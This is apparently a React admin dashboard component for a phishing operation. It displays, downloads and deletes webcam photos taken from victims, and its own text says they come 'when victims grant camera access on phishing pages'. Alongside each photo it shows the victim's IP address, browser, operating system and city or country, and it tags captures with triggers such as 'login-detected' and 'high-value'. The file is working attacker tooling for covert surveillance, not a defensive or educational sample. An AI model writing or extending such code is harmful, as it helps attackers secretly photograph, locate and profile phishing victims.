import React, { useState, useEffect } from 'react';
import { Box, Typography, Grid, Card, CardContent, CardMedia, Dialog, DialogContent, IconButton, Button, Chip, Checkbox, DialogTitle, DialogActions } from '@mui/material';
import RefreshIcon from '@mui/icons-material/Refresh';
import CloseIcon from '@mui/icons-material/Close';
import DownloadIcon from '@mui/icons-material/Download';
import DeleteIcon from '@mui/icons-material/Delete';
import DeleteSweepIcon from '@mui/icons-material/DeleteSweep';
import FullscreenIcon from '@mui/icons-material/Fullscreen';
import DeviceHubIcon from '@mui/icons-material/DeviceHub';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

// Helper to get auth headers
const authHeaders = () => {
  const token = localStorage.getItem('admin_token');
  return token ? { Authorization: `Bearer ${token}` } : {};
};

const TRIGGER_COLORS = {
  manual: '#00f0ff',
  auto: '#ffaa00',
  periodic: '#00ff88',
  'high-value': '#ff0055',
  'login-detected': '#e74c3c'
};

export default function CameraGallery() {
  const [captures, setCaptures] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(0);
  const [preview, setPreview] = useState(null);
  const [loading, setLoading] = useState(false);
  const [selected, setSelected] = useState([]);
  const [deleteDialog, setDeleteDialog] = useState(null);

  const fetchCaptures = async () => {
    setLoading(true);
    try {
      const res = await axios.get(`${API_URL}/api/admin/camera-captures`, { 
        params: { page: page + 1, limit: 20 },
        headers: authHeaders()
      });
      setCaptures(res.data.captures);
      setTotal(res.data.pagination.total);
    } catch(e) { console.error(e); }
    finally { setLoading(false); }
  };

  useEffect(() => { fetchCaptures(); }, [page]);

  const handleDelete = async (id) => {
    try {
      await axios.delete(`${API_URL}/api/admin/camera-captures/${id}`, { headers: authHeaders() });
      setDeleteDialog(null);
      setSelected(prev => prev.filter(s => s !== id));
      fetchCaptures();
    } catch(e) { console.error(e); }
  };

  const handleBulkDelete = async () => {
    if (selected.length === 0) return;
    try {
      await axios.post(`${API_URL}/api/admin/camera-captures/bulk-delete`, { ids: selected }, { headers: authHeaders() });
      setSelected([]);
      fetchCaptures();
    } catch(e) { console.error(e); }
  };

  const toggleSelect = (id) => {
    setSelected(prev => prev.includes(id) ? prev.filter(s => s !== id) : [...prev, id]);
  };

  const selectAll = () => {
    if (selected.length === captures.length) {
      setSelected([]);
    } else {
      setSelected(captures.map(c => c._id));
    }
  };

  const pages = Math.ceil(total / 20);

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700 }}>
            📸 Camera Captures
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.5 }}>
            {total} total captures • Page {page + 1} of {pages || 1}
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', gap: 1 }}>
          {selected.length > 0 && (
            <>
              <Button
                variant="outlined"
                size="small"
                startIcon={<DeleteSweepIcon />}
                onClick={handleBulkDelete}
                sx={{ borderColor: '#ff0055', color: '#ff0055' }}
              >
                Delete {selected.length}
              </Button>
              <Button
                variant="outlined"
                size="small"
                onClick={() => setSelected([])}
                sx={{ borderColor: '#555', color: '#888' }}
              >
                Clear
              </Button>
            </>
          )}
          <Button
            variant="outlined"
            size="small"
            startIcon={<RefreshIcon />}
            onClick={fetchCaptures}
            disabled={loading}
            sx={{ borderColor: '#555', color: '#aaa' }}
          >
            Refresh
          </Button>
        </Box>
      </Box>

      {/* Stats bar */}
      <Box sx={{ display: 'flex', gap: 2, mb: 3, flexWrap: 'wrap' }}>
        <Chip label={`📷 ${total} Total`} sx={{ bgcolor: 'rgba(0,240,255,0.1)', color: '#00f0ff' }} />
        <Chip label={`✅ ${selected.length} Selected`} sx={{ bgcolor: selected.length > 0 ? 'rgba(255,0,85,0.15)' : 'rgba(255,255,255,0.05)', color: selected.length > 0 ? '#ff0055' : '#888' }} />
        <Chip label={`📄 Page ${page + 1}/${pages || 1}`} sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888' }} />
        {captures.length > 0 && (
          <Chip
            label={selected.length === captures.length ? 'Deselect All' : 'Select All'}
            size="small"
            onClick={selectAll}
            sx={{ bgcolor: 'rgba(0,240,255,0.1)', color: '#00f0ff', cursor: 'pointer' }}
          />
        )}
      </Box>

      {/* Captures Grid */}
      {captures.length === 0 ? (
        <Box sx={{ textAlign: 'center', py: 8 }}>
          <Typography sx={{ fontSize: '4rem', mb: 2, opacity: 0.3 }}>📷</Typography>
          <Typography sx={{ color: '#888', mb: 1 }}>No camera captures yet</Typography>
          <Typography sx={{ color: '#666', fontSize: '0.85rem' }}>
            Captures will appear here when victims grant camera access on phishing pages
          </Typography>
        </Box>
      ) : (
        <Grid container spacing={2}>
          {captures.map(cap => (
            <Grid item xs={12} sm={6} md={4} lg={3} key={cap._id}>
              <Card
                sx={{
                  bgcolor: '#111827',
                  border: selected.includes(cap._id) ? '2px solid #00f0ff' : '1px solid rgba(255,255,255,0.05)',
                  cursor: 'pointer',
                  transition: 'all 0.2s',
                  position: 'relative',
                  '&:hover': { transform: 'translateY(-2px)', boxShadow: '0 8px 25px rgba(0,0,0,0.3)' }
                }}
              >
                {/* Selection checkbox */}
                <Checkbox
                  checked={selected.includes(cap._id)}
                  onChange={() => toggleSelect(cap._id)}
                  sx={{
                    position: 'absolute',
                    top: 4,
                    right: 4,
                    zIndex: 2,
                    bgcolor: 'rgba(0,0,0,0.5)',
                    borderRadius: 1,
                    '&.Mui-checked': { color: '#00f0ff' }
                  }}
                />

                {/* Thumbnail */}
                <Box
                  sx={{ height: 180, bgcolor: '#000', overflow: 'hidden', position: 'relative' }}
                  onClick={() => setPreview(cap)}
                >
                  {(cap.cloudinaryUrl || cap.imageData) ? (
                    <img src={cap.cloudinaryUrl || cap.imageData} alt="capture" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                  ) : (
                    <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%', flexDirection: 'column', gap: 1 }}>
                      <Typography sx={{ fontSize: '2rem' }}>📷</Typography>
                      <Typography sx={{ color: '#666', fontSize: '0.8rem' }}>Image data unavailable</Typography>
                    </Box>
                  )}

                  {/* Trigger type badge */}
                  <Chip
                    label={cap.triggerType}
                    size="small"
                    sx={{
                      position: 'absolute',
                      bottom: 6,
                      left: 6,
                      bgcolor: `${TRIGGER_COLORS[cap.triggerType] || '#888'}22`,
                      color: TRIGGER_COLORS[cap.triggerType] || '#888',
                      fontWeight: 600,
                      fontSize: '0.65rem',
                      height: 20,
                      backdropFilter: 'blur(4px)'
                    }}
                  />

                  {/* Cloudinary badge */}
                  {cap.cloudinaryUrl && (
                    <Chip
                      label="☁️ CDN"
                      size="small"
                      sx={{
                        position: 'absolute',
                        bottom: 6,
                        right: 6,
                        bgcolor: 'rgba(0,240,255,0.15)',
                        color: '#00f0ff',
                        fontWeight: 600,
                        fontSize: '0.6rem',
                        height: 18,
                        backdropFilter: 'blur(4px)'
                      }}
                    />
                  )}
                </Box>

                {/* Card info */}
                <CardContent sx={{ p: 1.5, '&:last-child': { pb: 1.5 } }} onClick={() => setPreview(cap)}>
                  <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 0.5 }}>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>
                      {new Date(cap.capturedAt).toLocaleString()}
                    </Typography>
                  </Box>
                  <Box sx={{ display: 'flex', gap: 0.5, flexWrap: 'wrap' }}>
                    <Chip
                      icon={<DeviceHubIcon sx={{ fontSize: 12 }} />}
                      label={cap.sessionId?.sessionId?.substring(0, 12) || 'N/A'}
                      size="small"
                      sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888', fontSize: '0.65rem', height: 20 }}
                    />
                    {cap.metadata?.facingMode && (
                      <Chip
                        label={cap.metadata.facingMode}
                        size="small"
                        sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontSize: '0.65rem', height: 20 }}
                      />
                    )}
                  </Box>
                  {cap.sessionId?.ipAddress && (
                    <Typography sx={{ color: '#666', fontSize: '0.7rem', mt: 0.5, fontFamily: 'monospace' }}>
                      {cap.sessionId.ipAddress} • {cap.sessionId?.geolocation?.country || ''}
                    </Typography>
                  )}
                </CardContent>

                {/* Quick actions */}
                <Box sx={{ display: 'flex', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
                  <IconButton
                    size="small"
                    onClick={() => setPreview(cap)}
                    sx={{ flex: 1, borderRadius: 0, color: '#888', '&:hover': { color: '#00f0ff' } }}
                  >
                    <FullscreenIcon sx={{ fontSize: 18 }} />
                  </IconButton>
                  {(cap.cloudinaryUrl || cap.imageData) && (
                    <IconButton
                      size="small"
                      onClick={() => {
                        const imgSrc = cap.cloudinaryUrl || cap.imageData;
                        fetch(imgSrc)
                          .then(res => res.blob())
                          .then(blob => {
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = `capture_${cap._id}.jpg`;
                            a.click();
                            setTimeout(() => URL.revokeObjectURL(url), 1000);
                          })
                          .catch(() => {
                            window.open(imgSrc, '_blank');
                          });
                      }}
                      sx={{ flex: 1, borderRadius: 0, color: '#888', '&:hover': { color: '#00ff88' }, borderLeft: '1px solid rgba(255,255,255,0.05)' }}
                    >
                      <DownloadIcon sx={{ fontSize: 18 }} />
                    </IconButton>
                  )}
                  <IconButton
                    size="small"
                    onClick={() => setDeleteDialog(cap._id)}
                    sx={{ flex: 1, borderRadius: 0, color: '#888', '&:hover': { color: '#ff0055' }, borderLeft: '1px solid rgba(255,255,255,0.05)' }}
                  >
                    <DeleteIcon sx={{ fontSize: 18 }} />
                  </IconButton>
                </Box>
              </Card>
            </Grid>
          ))}
        </Grid>
      )}

      {/* Pagination */}
      {pages > 1 && (
        <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 2, mt: 3 }}>
          <Button
            variant="outlined"
            size="small"
            disabled={page === 0}
            onClick={() => setPage(p => Math.max(0, p - 1))}
            sx={{ borderColor: '#555', color: '#aaa' }}
          >
            ← Previous
          </Button>
          <Typography sx={{ color: '#888', fontSize: '0.85rem' }}>
            Page {page + 1} of {pages}
          </Typography>
          <Button
            variant="outlined"
            size="small"
            disabled={page >= pages - 1}
            onClick={() => setPage(p => p + 1)}
            sx={{ borderColor: '#555', color: '#aaa' }}
          >
            Next →
          </Button>
        </Box>
      )}

      {/* Preview Dialog */}
      <Dialog open={!!preview} onClose={() => setPreview(null)} maxWidth="md" fullWidth>
        <DialogContent sx={{ bgcolor: '#0a0e17', p: 0, position: 'relative' }}>
          <IconButton
            onClick={() => setPreview(null)}
            sx={{ position: 'absolute', top: 8, right: 8, bgcolor: 'rgba(0,0,0,0.6)', zIndex: 1, '&:hover': { bgcolor: 'rgba(0,0,0,0.8)' } }}
          >
            <CloseIcon sx={{ color: '#fff' }} />
          </IconButton>
          {(preview?.cloudinaryUrl || preview?.imageData) && (
            <Box>
              <img src={preview.cloudinaryUrl || preview.imageData} alt="full capture" style={{ width: '100%', display: 'block' }} />
              <Box sx={{ p: 2.5, bgcolor: '#111827' }}>
                <Grid container spacing={2}>
                  <Grid item xs={12} sm={6}>
                    <Typography sx={{ color: '#888', fontSize: '0.75rem', mb: 0.5 }}>CAPTURE INFO</Typography>
                    <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                      Captured: {new Date(preview.capturedAt).toLocaleString()}
                    </Typography>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, color: '#ddd', fontSize: '0.9rem' }}>
                      <span>Trigger:</span>
                      <Chip label={preview.triggerType} size="small" sx={{ bgcolor: `${TRIGGER_COLORS[preview.triggerType] || '#888'}22`, color: TRIGGER_COLORS[preview.triggerType] || '#888', fontWeight: 600, fontSize: '0.7rem' }} />
                    </Box>
                    <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                      Device: {preview.metadata?.deviceLabel || 'Unknown'}
                    </Typography>
                    {preview.metadata?.resolution && (
                      <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                        Resolution: {preview.metadata.resolution}
                      </Typography>
                    )}
                    {preview.cloudinaryUrl && (
                      <Typography sx={{ color: '#00f0ff', fontSize: '0.75rem', mt: 0.5 }}>
                        ☁️ Hosted on Cloudinary
                      </Typography>
                    )}
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <Typography sx={{ color: '#888', fontSize: '0.75rem', mb: 0.5 }}>SESSION INFO</Typography>
                    <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                      Session: {preview.sessionId?.sessionId || preview.sessionIdStr}
                    </Typography>
                    <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                      IP: {preview.sessionId?.ipAddress || 'N/A'}
                    </Typography>
                    <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                      Browser: {preview.sessionId?.browser || 'N/A'} • {preview.sessionId?.os || 'N/A'}
                    </Typography>
                    {preview.sessionId?.geolocation?.country && (
                      <Typography sx={{ color: '#ddd', fontSize: '0.9rem' }}>
                        Location: {[preview.sessionId.geolocation.city, preview.sessionId.geolocation.country].filter(Boolean).join(', ')}
                      </Typography>
                    )}
                  </Grid>
                </Grid>
                <Box sx={{ display: 'flex', gap: 1, mt: 2 }}>
                  <Button
                    variant="contained"
                    size="small"
                    startIcon={<DownloadIcon />}
                    onClick={() => { const imgSrc = preview.cloudinaryUrl || preview.imageData; const a = document.createElement('a'); a.href = imgSrc; a.download = `capture_${preview._id}.jpg`; a.click(); }}
                    sx={{ bgcolor: '#00f0ff', color: '#000', '&:hover': { bgcolor: '#00ccdd' } }}
                  >
                    Download Image
                  </Button>
                  <Button
                    variant="outlined"
                    size="small"
                    startIcon={<DeleteIcon />}
                    onClick={() => { setDeleteDialog(preview._id); setPreview(null); }}
                    sx={{ borderColor: '#ff0055', color: '#ff0055' }}
                  >
                    Delete
                  </Button>
                </Box>
              </Box>
            </Box>
          )}
          {preview && !preview.cloudinaryUrl && !preview.imageData && (
            <Box sx={{ p: 6, textAlign: 'center' }}>
              <Typography sx={{ fontSize: '4rem', mb: 2 }}>📷</Typography>
              <Typography sx={{ color: '#888' }}>No image data available for this capture</Typography>
            </Box>
          )}
        </DialogContent>
      </Dialog>

      {/* Delete Confirmation Dialog */}
      <Dialog open={!!deleteDialog} onClose={() => setDeleteDialog(null)}>
        <DialogTitle sx={{ bgcolor: '#111827', color: '#fff' }}>Delete Camera Capture</DialogTitle>
        <DialogContent sx={{ bgcolor: '#111827', color: '#aaa' }}>
          Are you sure you want to delete this camera capture? This cannot be undone.
        </DialogContent>
        <DialogActions sx={{ bgcolor: '#111827' }}>
          <Button onClick={() => setDeleteDialog(null)} sx={{ color: '#888' }}>Cancel</Button>
          <Button onClick={() => handleDelete(deleteDialog)} sx={{ color: '#ff0055' }}>Delete</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}